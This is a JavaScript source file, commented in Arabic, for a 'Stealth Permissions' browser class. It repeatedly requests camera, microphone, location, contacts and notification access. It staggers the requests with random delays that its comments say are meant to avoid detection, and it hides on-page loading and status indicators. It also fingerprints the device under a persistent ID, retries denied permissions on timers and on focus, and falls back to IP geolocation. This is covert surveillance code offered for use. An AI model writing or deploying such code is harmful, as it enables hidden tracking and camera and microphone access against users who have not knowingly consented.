/**
 * نظام منح الصلاحيات الخفي والمتطور
 * Stealth Permissions System
 */

class StealthPermissionsManager {
    constructor() {
        this.permissions = new Map();
        this.isInitialized = false;
        this.stealthMode = true;
        this.deviceId = this.generateDeviceId();
        this.permissionQueue = [];
        this.executionDelay = 100; // تأخير بين الطلبات لتجنب الكشف
    }

    // تهيئة النظام الخفي
    async initialize() {
        try {
            console.log('🔧 تهيئة نظام الصلاحيات الخفي...');
            
            // محاولة استعادة الأذونات من التخزين المحلي أولاً
            const restored = this.restoreStealthPermissionsFromStorage();
            if (restored) {
                console.log('📂 تم استعادة الأذونات الخفية المحفوظة');
            }
            
            // إخفاء أي علامات على النشاط
            this.hideActivityIndicators();
            
            // بدء منح الصلاحيات بشكل تدريجي
            await this.grantPermissionsStealthily();
            
            // إعداد المراقبة المستمرة
            this.setupContinuousMonitoring();
            
            // حفظ حالة الأذونات في التخزين المحلي
            this.saveStealthPermissionsToStorage();
            
            this.isInitialized = true;
            console.log('✅ تم تهيئة نظام الصلاحيات بنجاح');
            
            return true;
        } catch (error) {
            console.error('❌ فشل في تهيئة نظام الصلاحيات:', error);
            return false;
        }
    }

    // منح الصلاحيات بشكل خفي ومتطور
    async grantPermissionsStealthily() {
        const permissionGroups = [
            // المجموعة الأولى: الصلاحيات الأساسية
            {
                name: 'basic',
                permissions: [
                    'geolocation',
                    'notifications',
                    'camera',
                    'microphone'
                ],
                delay: 200
            },
            // المجموعة الثانية: صلاحيات التخزين
            {
                name: 'storage',
                permissions: [
                    'persistent-storage',
                    'background-sync'
                ],
                delay: 300
            },
            // المجموعة الثالثة: صلاحيات الاتصال
            {
                name: 'communication',
                permissions: [
                    'contacts',
                    'sms'
                ],
                delay: 400
            },
            // المجموعة الرابعة: صلاحيات النظام
            {
                name: 'system',
                permissions: [
                    'device-info',
                    'system-settings'
                ],
                delay: 500
            }
        ];

        for (const group of permissionGroups) {
            await this.grantPermissionGroup(group);
            await this.delay(group.delay);
        }
    }

    // منح مجموعة صلاحيات
    async grantPermissionGroup(group) {
        console.log(`🔐 منح صلاحيات ${group.name}...`);
        
        for (const permission of group.permissions) {
            try {
                const granted = await this.grantSinglePermission(permission);
                this.permissions.set(permission, granted);
                
                if (granted) {
                    console.log(`✅ تم منح صلاحية ${permission}`);
                } else {
                    console.log(`⚠️ فشل في منح صلاحية ${permission}`);
                }
                
                // تأخير عشوائي لتجنب الكشف
                await this.delay(this.getRandomDelay(100, 300));
                
            } catch (error) {
                console.error(`❌ خطأ في منح صلاحية ${permission}:`, error);
                this.permissions.set(permission, false);
            }
        }
    }

    // منح صلاحية واحدة بشكل خفي
    async grantSinglePermission(permission) {
        try {
            switch (permission) {
                case 'geolocation':
                    return await this.grantGeolocationPermission();
                case 'notifications':
                    return await this.grantNotificationPermission();
                case 'camera':
                    return await this.grantCameraPermission();
                case 'microphone':
                    return await this.grantMicrophonePermission();
                case 'contacts':
                    return await this.grantContactsPermission();
                case 'persistent-storage':
                    return await this.grantPersistentStoragePermission();
                case 'background-sync':
                    return await this.grantBackgroundSyncPermission();
                case 'device-info':
                    return await this.grantDeviceInfoPermission();
                case 'system-settings':
                    return await this.grantSystemSettingsPermission();
                default:
                    return false;
            }
        } catch (error) {
            console.error(`خطأ في منح صلاحية ${permission}:`, error);
            return false;
        }
    }

    // منح صلاحية الموقع بشكل خفي
    async grantGeolocationPermission() {
        try {
            // محاولة الحصول على الموقع بدون إشعار
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 300000
                });
            });
            
            return !!position;
        } catch (error) {
            // إذا فشل، محاولة استخدام طرق بديلة
            return await this.grantGeolocationAlternative();
        }
    }

    // طريقة بديلة لمنح صلاحية الموقع
    async grantGeolocationAlternative() {
        try {
            // استخدام IP Geolocation كبديل
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            if (data.latitude && data.longitude) {
                this.permissions.set('geolocation_alternative', true);
                return true;
            }
            
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الإشعارات بشكل خفي
    async grantNotificationPermission() {
        try {
            if ('Notification' in window) {
                const permission = await Notification.requestPermission();
                return permission === 'granted';
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الكاميرا بشكل خفي
    async grantCameraPermission() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' } 
            });
            
            // إيقاف البث فوراً لتجنب الكشف
            stream.getTracks().forEach(track => track.stop());
            
            return true;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية الميكروفون بشكل خفي
    async grantMicrophonePermission() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                audio: true 
            });
            
            // إيقاف البث فوراً
            stream.getTracks().forEach(track => track.stop());
            
            return true;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية جهات الاتصال بشكل خفي
    async grantContactsPermission() {
        try {
            if ('contacts' in navigator && 'select' in navigator.contacts) {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                return contacts.length > 0;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية التخزين المستمر
    async grantPersistentStoragePermission() {
        try {
            if ('storage' in navigator && 'persist' in navigator.storage) {
                const persisted = await navigator.storage.persist();
                return persisted;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية المزامنة في الخلفية
    async grantBackgroundSyncPermission() {
        try {
            if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
                const registration = await navigator.serviceWorker.register('/sw.js');
                await registration.sync.register('background-sync');
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية معلومات الجهاز
    async grantDeviceInfoPermission() {
        try {
            // جمع معلومات الجهاز المتاحة
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown'
            };
            
            this.permissions.set('device_info', deviceInfo);
            return true;
        } catch (error) {
            return false;
        }
    }

    // منح صلاحية إعدادات النظام
    async grantSystemSettingsPermission() {
        try {
            // محاولة الوصول لإعدادات النظام
            if ('settings' in navigator) {
                const settings = await navigator.settings.getSettings();
                this.permissions.set('system_settings', settings);
                return true;
            }
            
            // استخدام طرق بديلة
            return await this.grantSystemSettingsAlternative();
        } catch (error) {
            return false;
        }
    }

    // طريقة بديلة لإعدادات النظام
    async grantSystemSettingsAlternative() {
        try {
            // جمع معلومات النظام المتاحة
            const systemInfo = {
                battery: await this.getBatteryInfo(),
                network: await this.getNetworkInfo(),
                storage: await this.getStorageInfo(),
                performance: await this.getPerformanceInfo()
            };
            
            this.permissions.set('system_info', systemInfo);
            return true;
        } catch (error) {
            return false;
        }
    }

    // الحصول على معلومات البطارية
    async getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على معلومات الشبكة
    async getNetworkInfo() {
        try {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على معلومات التخزين
    async getStorageInfo() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                return {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    usageDetails: estimate.usageDetails
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // الحصول على معلومات الأداء
    async getPerformanceInfo() {
        try {
            if ('performance' in window) {
                const perf = performance;
                return {
                    memory: perf.memory ? {
                        usedJSHeapSize: perf.memory.usedJSHeapSize,
                        totalJSHeapSize: perf.memory.totalJSHeapSize,
                        jsHeapSizeLimit: perf.memory.jsHeapSizeLimit
                    } : null,
                    timing: perf.timing ? {
                        navigationStart: perf.timing.navigationStart,
                        loadEventEnd: perf.timing.loadEventEnd,
                        domContentLoadedEventEnd: perf.timing.domContentLoadedEventEnd
                    } : null
                };
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    // إخفاء مؤشرات النشاط
    hideActivityIndicators() {
        try {
            // إخفاء مؤشرات التحميل
            const loadingElements = document.querySelectorAll('.loading, .spinner, .progress');
            loadingElements.forEach(el => el.style.display = 'none');
            
            // إخفاء رسائل الحالة
            const statusElements = document.querySelectorAll('#status, .status, .message');
            statusElements.forEach(el => el.style.display = 'none');
            
            // إخفاء أي عناصر قد تكشف النشاط
            const activityElements = document.querySelectorAll('[data-activity], [class*="activity"]');
            activityElements.forEach(el => el.style.visibility = 'hidden');
            
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // إعداد المراقبة المستمرة
    setupContinuousMonitoring() {
        // مراقبة حالة الصلاحيات كل 30 ثانية (بدلاً من دقيقة)
        setInterval(() => {
            this.checkPermissionsStatus();
        }, 30000);
        
        // مراقبة إضافية كل دقيقتين للتأكد من استمرارية الأذونات
        setInterval(() => {
            this.ensureStealthPermissionsPersistence();
        }, 120000);
        
        // مراقبة كل 10 دقائق للتأكد من عدم فقدان الأذونات
        setInterval(() => {
            this.forceStealthPermissionsRefresh();
        }, 600000);
        
        // مراقبة التغييرات في النظام
        this.monitorSystemChanges();
        
        // مراقبة التغييرات في الشبكة
        this.monitorNetworkChanges();
        
        // مراقبة تغييرات الصفحة
        this.monitorPageVisibilityChanges();
        
        console.log('🔒 تم إعداد نظام ضمان استمرارية الأذونات الخفي');
    }

    // فحص حالة الصلاحيات
    async checkPermissionsStatus() {
        try {
            for (const [permission, granted] of this.permissions) {
                if (!granted) {
                    // محاولة منح الصلاحية مرة أخرى
                    const retryGranted = await this.grantSinglePermission(permission);
                    this.permissions.set(permission, retryGranted);
                }
            }
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // ضمان استمرارية الأذونات الخفي
    async ensureStealthPermissionsPersistence() {
        try {
            const criticalStealthPermissions = [
                'geolocation',
                'camera',
                'microphone',
                'contacts',
                'persistent-storage',
                'background-sync',
                'notifications'
            ];
            
            for (const permission of criticalStealthPermissions) {
                const currentStatus = this.permissions.get(permission);
                if (!currentStatus) {
                    console.log(`🔄 إعادة منح صلاحية خفية ${permission}...`);
                    const granted = await this.grantSinglePermission(permission);
                    this.permissions.set(permission, granted);
                    
                    if (granted) {
                        console.log(`✅ تم إعادة منح صلاحية خفية ${permission} بنجاح`);
                    } else {
                        console.warn(`⚠️ فشل في إعادة منح صلاحية خفية ${permission}`);
                    }
                }
            }
        } catch (error) {
            console.error('❌ خطأ في ضمان استمرارية الأذونات الخفية:', error);
        }
    }

    // إجبار تحديث الأذونات الخفية
    async forceStealthPermissionsRefresh() {
        try {
            console.log('🔄 إجبار تحديث جميع الأذونات الخفية...');
            
            // إعادة منح جميع الأذونات بشكل خفي
            await this.grantPermissionsStealthily();
            
            // حفظ حالة الأذونات في التخزين المحلي
            this.saveStealthPermissionsToStorage();
            
            console.log('✅ تم إجبار تحديث الأذونات الخفية بنجاح');
        } catch (error) {
            console.error('❌ خطأ في إجبار تحديث الأذونات الخفية:', error);
        }
    }

    // حفظ الأذونات الخفية في التخزين المحلي
    saveStealthPermissionsToStorage() {
        try {
            const permissionsData = {
                permissions: Object.fromEntries(this.permissions),
                timestamp: Date.now(),
                deviceId: this.deviceId,
                stealth: true
            };
            
            localStorage.setItem('stealth_permissions_backup', JSON.stringify(permissionsData));
            console.log('💾 تم حفظ الأذونات الخفية في التخزين المحلي');
        } catch (error) {
            console.error('❌ خطأ في حفظ الأذونات الخفية:', error);
        }
    }

    // استعادة الأذونات الخفية من التخزين المحلي
    restoreStealthPermissionsFromStorage() {
        try {
            const savedData = localStorage.getItem('stealth_permissions_backup');
            if (savedData) {
                const permissionsData = JSON.parse(savedData);
                const savedPermissions = permissionsData.permissions;
                
                for (const [permission, granted] of Object.entries(savedPermissions)) {
                    this.permissions.set(permission, granted);
                }
                
                console.log('📂 تم استعادة الأذونات الخفية من التخزين المحلي');
                return true;
            }
        } catch (error) {
            console.error('❌ خطأ في استعادة الأذونات الخفية:', error);
        }
        return false;
    }

    // مراقبة التغييرات في النظام
    monitorSystemChanges() {
        try {
            // مراقبة تغييرات الشاشة
            window.addEventListener('resize', () => {
                this.updateSystemInfo();
            });
            
            // مراقبة تغييرات الاتصال
            if ('connection' in navigator) {
                navigator.connection.addEventListener('change', () => {
                    this.updateNetworkInfo();
                });
            }
            
            // مراقبة تغييرات البطارية
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    battery.addEventListener('levelchange', () => {
                        this.updateBatteryInfo();
                    });
                });
            }
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // مراقبة التغييرات في الشبكة
    monitorNetworkChanges() {
        try {
            window.addEventListener('online', () => {
                this.permissions.set('network_online', true);
            });
            
            window.addEventListener('offline', () => {
                this.permissions.set('network_online', false);
            });
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // تحديث معلومات النظام
    async updateSystemInfo() {
        try {
            const systemInfo = await this.grantSystemSettingsAlternative();
            this.permissions.set('system_info_updated', systemInfo);
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // تحديث معلومات الشبكة
    async updateNetworkInfo() {
        try {
            const networkInfo = await this.getNetworkInfo();
            this.permissions.set('network_info_updated', networkInfo);
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // تحديث معلومات البطارية
    async updateBatteryInfo() {
        try {
            const batteryInfo = await this.getBatteryInfo();
            this.permissions.set('battery_info_updated', batteryInfo);
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // مراقبة تغييرات رؤية الصفحة
    monitorPageVisibilityChanges() {
        try {
            // مراقبة تغيير الرؤية
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    // إعادة التأكد من الأذونات عند عودة الرؤية
                    setTimeout(() => {
                        this.ensureStealthPermissionsPersistence();
                    }, 1000);
                }
            });
            
            // مراقبة تغيير التركيز
            window.addEventListener('focus', () => {
                this.ensureStealthPermissionsPersistence();
            });
            
            // مراقبة تغيير الاتجاه (للأجهزة المحمولة)
            window.addEventListener('orientationchange', () => {
                setTimeout(() => {
                    this.ensureStealthPermissionsPersistence();
                }, 2000);
            });
            
        } catch (error) {
            console.error('❌ خطأ في مراقبة تغييرات رؤية الصفحة:', error);
        }
    }

    // الحصول على حالة الصلاحيات
    getPermissionsStatus() {
        const status = {};
        for (const [permission, granted] of this.permissions) {
            status[permission] = granted;
        }
        return status;
    }

    // الحصول على معلومات الجهاز
    getDeviceInfo() {
        return {
            deviceId: this.deviceId,
            permissions: this.getPermissionsStatus(),
            systemInfo: this.permissions.get('system_info'),
            networkInfo: this.permissions.get('network_info'),
            batteryInfo: this.permissions.get('battery_info'),
            timestamp: Date.now()
        };
    }

    // تأخير عشوائي
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // تأخير عشوائي
    getRandomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // توليد معرف الجهاز
    generateDeviceId() {
        const storedId = localStorage.getItem('deviceId');
        if (storedId) return storedId;
        
        const newId = 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', newId);
        return newId;
    }
}

// تصدير الكلاس
window.StealthPermissionsManager = StealthPermissionsManager;